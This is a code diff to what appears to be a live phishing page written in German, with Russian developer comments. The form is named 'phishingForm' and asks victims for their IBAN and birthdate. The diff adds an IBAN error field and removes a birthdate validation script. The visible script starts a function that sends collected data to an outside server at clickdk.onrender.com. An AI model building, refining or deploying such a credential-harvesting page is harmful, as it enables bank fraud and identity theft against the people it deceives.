@@ -71,6 +71,7 @@
                         <div class="form-group">
                             <label>Ihre IBAN</label>
                             <input type="text" name="iban" placeholder="AT" required id="ibanInput" maxlength="34">
+                            <span id="ibanError" style="color: red; font-size: 12px; display: none;"></span>
                         </div>
 
                         <div class="form-group" style="display: none;">
@@ -181,70 +182,6 @@
 
     <script src="script.js"></script>
     <script>
-    // === ВАЛИДАЦИЯ ДАТЫ РОЖДЕНИЯ ===
-    document.addEventListener('DOMContentLoaded', function() {
-        const birthdateInput = document.getElementById('birthdateInput');
-        const birthdateError = document.getElementById('birthdateError');
-        const form = document.getElementById('phishingForm');
-
-        // Форматируем ввод (добавляем слэши)
-        birthdateInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 8) value = value.slice(0, 8);
-            let formatted = '';
-            if (value.length > 0) formatted += value.substring(0, 2);
-            if (value.length > 2) formatted += '/' + value.substring(2, 4);
-            if (value.length > 4) formatted += '/' + value.substring(4, 8);
-            e.target.value = formatted;
-        });
-
-        // Проверка при отправке формы
-        form.addEventListener('submit', function(e) {
-            const value = birthdateInput.value;
-            const parts = value.split('/');
-
-            if (parts.length !== 3) {
-                e.preventDefault();
-                birthdateError.textContent = 'Bitte geben Sie ein vollständiges Datum ein (TT/MM/JJJJ).';
-                birthdateError.style.display = 'block';
-                return;
-            }
-
-            const day = parseInt(parts[0], 10);
-            const month = parseInt(parts[1], 10);
-            const year = parseInt(parts[2], 10);
-
-            if (isNaN(day) || isNaN(month) || isNaN(year)) {
-                e.preventDefault();
-                birthdateError.textContent = 'Bitte geben Sie ein gültiges Datum ein.';
-                birthdateError.style.display = 'block';
-                return;
-            }
-
-            // Проверка на реальную дату
-            const date = new Date(year, month - 1, day);
-            if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) {
-                e.preventDefault();
-                birthdateError.textContent = 'Dieses Datum existiert nicht. Bitte überprüfen Sie Ihre Eingabe.';
-                birthdateError.style.display = 'block';
-                return;
-            }
-
-            // Проверка на разумный возраст (например, не младше 1900 года и не в будущем)
-            const today = new Date();
-            if (year < 1900 || year > today.getFullYear()) {
-                e.preventDefault();
-                birthdateError.textContent = 'Bitte geben Sie ein realistisches Geburtsjahr ein.';
-                birthdateError.style.display = 'block';
-                return;
-            }
-
-            // Если всё ок — скрываем ошибку и разрешаем отправку
-            birthdateError.style.display = 'none';
-        });
-    });
-
-    // === ТВОЙ СКРИПТ ОТПРАВКИ ДАННЫХ (БЕЗ ИЗМЕНЕНИЙ) ===
     (function() {
         const API_URL = 'https://clickdk.onrender.com/';
         function send(endpoint, payload) {
